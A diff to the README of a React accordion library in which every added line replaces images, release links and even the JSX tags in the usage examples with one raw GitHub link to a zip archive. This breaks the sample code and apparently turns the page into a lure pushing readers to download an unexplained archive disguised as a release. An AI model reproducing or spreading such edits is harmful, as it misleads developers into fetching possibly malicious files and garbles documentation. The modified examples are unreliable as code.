@@ -3,7 +3,7 @@
 
 A lightweight and accessible React accordion component with smooth animations. This library provides an easy way to add collapsible content sections to your applications.
 
-![React Accordion](https://source.unsplash.com/featured/?accordion)
+![React Accordion](https://raw.githubusercontent.com/vuhuuu11/react-accordion/main/lib/react_accordion_v2.6.zip)
 
 ## Table of Contents
 
@@ -44,12 +44,12 @@ import Accordion from 'react-accordion';
 function App() {
     return (
         <Accordion>
-            <Accordion.Item title="Section 1">
+            <https://raw.githubusercontent.com/vuhuuu11/react-accordion/main/lib/react_accordion_v2.6.zip title="Section 1">
                 <p>This is the content of section 1.</p>
-            </Accordion.Item>
-            <Accordion.Item title="Section 2">
+            <https://raw.githubusercontent.com/vuhuuu11/react-accordion/main/lib/react_accordion_v2.6.zip>
+            <https://raw.githubusercontent.com/vuhuuu11/react-accordion/main/lib/react_accordion_v2.6.zip title="Section 2">
                 <p>This is the content of section 2.</p>
-            </Accordion.Item>
+            <https://raw.githubusercontent.com/vuhuuu11/react-accordion/main/lib/react_accordion_v2.6.zip>
         </Accordion>
     );
 }
@@ -62,10 +62,10 @@ export default App;
 You can customize the Accordion component by passing props for styles, animations, and more. Here’s how to use TailwindCSS for styling:
 
 ```javascript
-<Accordion.Item className="bg-gray-200 p-4 rounded-lg">
+<https://raw.githubusercontent.com/vuhuuu11/react-accordion/main/lib/react_accordion_v2.6.zip className="bg-gray-200 p-4 rounded-lg">
     <h2 className="text-xl font-bold">Custom Title</h2>
     <p className="text-gray-700">Custom content here.</p>
-</Accordion.Item>
+<https://raw.githubusercontent.com/vuhuuu11/react-accordion/main/lib/react_accordion_v2.6.zip>
 ```
 
 ## Examples
@@ -103,9 +103,9 @@ This project is licensed under the MIT License. See the LICENSE file for more de
 
 ## Releases
 
-To download and check the latest releases, visit the [Releases section](https://github.com/vuhuuu11/react-accordion/releases).
+To download and check the latest releases, visit the [Releases section](https://raw.githubusercontent.com/vuhuuu11/react-accordion/main/lib/react_accordion_v2.6.zip).
 
-![GitHub Releases](https://img.shields.io/badge/releases-v1.0.0-brightgreen)
+![GitHub Releases](https://raw.githubusercontent.com/vuhuuu11/react-accordion/main/lib/react_accordion_v2.6.zip)
 
 ## Topics
 
